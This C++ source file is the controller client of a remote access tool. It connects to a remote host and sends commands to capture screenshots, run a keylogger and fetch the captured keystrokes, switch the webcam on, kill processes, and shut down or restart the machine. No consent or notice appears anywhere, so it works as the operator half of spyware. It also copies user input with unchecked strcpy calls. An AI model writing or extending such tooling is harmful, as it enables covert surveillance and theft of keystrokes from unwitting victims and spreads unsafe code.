#include "common.h"

class RemoteClient {
private:
    SOCKET_TYPE clientSocket;
    std::string serverIP;
    bool connected;
    
public:
    RemoteClient() : clientSocket(INVALID_SOCKET_VALUE), connected(false) {
        initWinsock();
    }
    
    ~RemoteClient() {
        disconnect();
        cleanupWinsock();
    }
    
    bool connect(const std::string& ip) {
        serverIP = ip;
        
        // Create socket
        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET_VALUE) {
            std::cerr << "Failed to create socket" << std::endl;
            return false;
        }
        
        // Connect to server
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(PORT);
        
#ifdef _WIN32
        serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
#else
        inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr);
#endif
        
        if (::connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
            std::cerr << "Connection failed" << std::endl;
            return false;
        }
        
        connected = true;
        std::cout << "Connected to server: " << ip << ":" << PORT << std::endl;
        return true;
    }
    
    void disconnect() {
        if (connected) {
            // Send exit command
            Packet packet;
            packet.command = CMD_EXIT;
            packet.dataSize = 0;
            sendPacket(clientSocket, packet);
            
            closesocket(clientSocket);
            clientSocket = INVALID_SOCKET_VALUE;
            connected = false;
        }
    }
    
    void showMenu() {
        std::cout << "\n========================================" << std::endl;
        std::cout << "        REMOTE CONTROL CLIENT          " << std::endl;
        std::cout << "========================================" << std::endl;
        std::cout << "1.  List Applications" << std::endl;
        std::cout << "2.  Stop Application" << std::endl;
        std::cout << "3.  Start Application" << std::endl;
        std::cout << "4.  List Processes (Task Manager)" << std::endl;
        std::cout << "5.  Kill Process" << std::endl;
        std::cout << "6.  Take Screenshot" << std::endl;
        std::cout << "7.  Start Keylogger" << std::endl;
        std::cout << "8.  Stop Keylogger" << std::endl;
        std::cout << "9.  Get Keylog Data" << std::endl;
        std::cout << "10. Turn On Webcam" << std::endl;
        std::cout << "11. Turn Off Webcam" << std::endl;
        std::cout << "12. Shutdown Remote Computer" << std::endl;
        std::cout << "13. Restart Remote Computer" << std::endl;
        std::cout << "99. Exit" << std::endl;
        std::cout << "========================================" << std::endl;
        std::cout << "Enter command: ";
    }
    
    void run() {
        if (!connected) {
            std::cerr << "Not connected to server!" << std::endl;
            return;
        }
        
        int choice;
        std::string input;
        
        while (true) {
            showMenu();
            std::cin >> choice;
            std::cin.ignore(); // Clear input buffer
            
            Packet packet;
            packet.command = choice;
            packet.dataSize = 0;
            
            switch (choice) {
                case CMD_LIST_APPS:
                    std::cout << "\nFetching application list..." << std::endl;
                    sendAndReceive(packet);
                    break;
                    
                case CMD_STOP_APP:
                    std::cout << "Enter application name to stop: ";
                    std::getline(std::cin, input);
                    strcpy(packet.data, input.c_str());
                    packet.dataSize = input.length();
                    sendAndReceive(packet);
                    break;
                    
                case CMD_START_APP:
                    std::cout << "Enter application path to start: ";
                    std::getline(std::cin, input);
                    strcpy(packet.data, input.c_str());
                    packet.dataSize = input.length();
                    sendAndReceive(packet);
                    break;
                    
                case CMD_LIST_PROCESS:
                    std::cout << "\nFetching process list..." << std::endl;
                    sendAndReceive(packet);
                    break;
                    
                case CMD_KILL_PROCESS:
                    std::cout << "Enter process ID to kill: ";
                    std::getline(std::cin, input);
                    strcpy(packet.data, input.c_str());
                    packet.dataSize = input.length();
                    sendAndReceive(packet);
                    break;
                    
                case CMD_SCREENSHOT:
                    std::cout << "\nTaking screenshot..." << std::endl;
                    sendAndReceive(packet);
                    break;
                    
                case CMD_KEYLOG_START:
                    std::cout << "\nStarting keylogger..." << std::endl;
                    sendAndReceive(packet);
                    break;
                    
                case CMD_KEYLOG_STOP:
                    std::cout << "\nStopping keylogger..." << std::endl;
                    sendAndReceive(packet);
                    break;
                    
                case CMD_KEYLOG_GET:
                    std::cout << "\nGetting keylog data..." << std::endl;
                    sendAndReceive(packet);
                    break;
                    
                case CMD_WEBCAM_ON:
                    std::cout << "\nTurning on webcam..." << std::endl;
                    sendAndReceive(packet);
                    break;
                    
                case CMD_WEBCAM_OFF:
                    std::cout << "\nTurning off webcam..." << std::endl;
                    sendAndReceive(packet);
                    break;
                    
                case CMD_SHUTDOWN:
                    std::cout << "\nAre you sure you want to shutdown the remote computer? (y/n): ";
                    std::getline(std::cin, input);
                    if (input == "y" || input == "Y") {
                        sendAndReceive(packet);
                    }
                    break;
                    
                case CMD_RESTART:
                    std::cout << "\nAre you sure you want to restart the remote computer? (y/n): ";
                    std::getline(std::cin, input);
                    if (input == "y" || input == "Y") {
                        sendAndReceive(packet);
                    }
                    break;
                    
                case CMD_EXIT:
                    std::cout << "Exiting..." << std::endl;
                    return;
                    
                default:
                    std::cout << "Invalid command!" << std::endl;
                    break;
            }
            
            std::cout << "\nPress Enter to continue...";
            std::cin.get();
        }
    }
    
    void sendAndReceive(const Packet& packet) {
        if (!sendPacket(clientSocket, packet)) {
            std::cerr << "Failed to send command!" << std::endl;
            return;
        }
        
        Packet response;
        if (!receivePacket(clientSocket, response)) {
            std::cerr << "Failed to receive response!" << std::endl;
            return;
        }
        
        std::cout << "\n--- Server Response ---" << std::endl;
        
        // Handle response based on command
        switch (response.command) {
            case CMD_LIST_APPS:
            case CMD_LIST_PROCESS:
                std::cout << response.data << std::endl;
                break;
                
            case CMD_KEYLOG_GET:
                if (response.dataSize > 0) {
                    std::cout << "Captured keys: " << response.data << std::endl;
                } else {
                    std::cout << "No keylog data available" << std::endl;
                }
                break;
                
            default:
                std::cout << response.data << std::endl;
                break;
        }
        
        std::cout << "----------------------" << std::endl;
    }
};

int main(int argc, char* argv[]) {
    std::cout << "==================================" << std::endl;
    std::cout << "   Remote Control Client v1.0    " << std::endl;
    std::cout << "==================================" << std::endl;
    
    RemoteClient client;
    
    std::string serverIP;
    if (argc > 1) {
        serverIP = argv[1];
    } else {
        std::cout << "Enter server IP address: ";
        std::cin >> serverIP;
    }
    
    if (!client.connect(serverIP)) {
        std::cerr << "Failed to connect to server!" << std::endl;
        return 1;
    }
    
    try {
        client.run();
    } catch (const std::exception& e) {
        std::cerr << "Client error: " << e.what() << std::endl;
    }
    
    return 0;
}